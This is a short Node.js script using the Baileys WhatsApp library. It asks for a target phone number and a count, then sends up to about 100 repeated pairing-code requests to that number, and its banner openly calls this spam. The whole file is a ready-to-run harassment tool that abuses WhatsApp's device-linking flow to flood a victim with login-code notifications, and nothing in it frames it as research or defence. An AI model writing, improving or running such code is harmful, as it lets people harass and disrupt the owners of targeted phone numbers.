const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");


    const color = [
        '\x1b[31m', 
        '\x1b[32m', 
        '\x1b[33m', 
        '\x1b[34m', 
        '\x1b[35m', 
        '\x1b[36m'
    ];
    const KurumiColor = color[Math.floor(Math.random() * color.length)];

const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

async function KurumiProject() {
    const { state } = await useMultiFileAuthState('./69/session');
    const KurumiBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });
    try {
        // Ask for phone number
        const phoneNumber = await question(KurumiColor + 'Target : ' + xColor);
        
        // Request the desired number of pairing codes
        const KurumiCodes = parseInt(await question(KurumiColor + 'Jumlah : '+ xColor));

        if (isNaN(KurumiCodes) || KurumiCodes <= 0) {
            console.log('example : 20.');
            return;
        }

        // Get and display pairing code
        for (let i = 0; i < KurumiCodes; i++) {
            try {
                let code = await KurumiBotInc.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(KurumiColor + `${phoneNumber} [${i + 1}/${KurumiCodes}]`+ xColor);
            } catch (error) {
                console.error('Error:', error.message);
            }
        }
    } catch (error) {
                 console.error('error') ;
}

    return KurumiBotInc;
}
console.log(KurumiColor + `Running...
=========================
┏❐ FOLLOW THE INSTRUCTIONS BELOW, TO SPAM
┃
┃⭔ Input Number Target ( 62xxxxxxx )
┃⭔ Input How Much ( 1-100 )
┃
┗❐ PERFORM THE ABOVE COMMAND NOW 
=========================` + xColor);

KurumiProject();
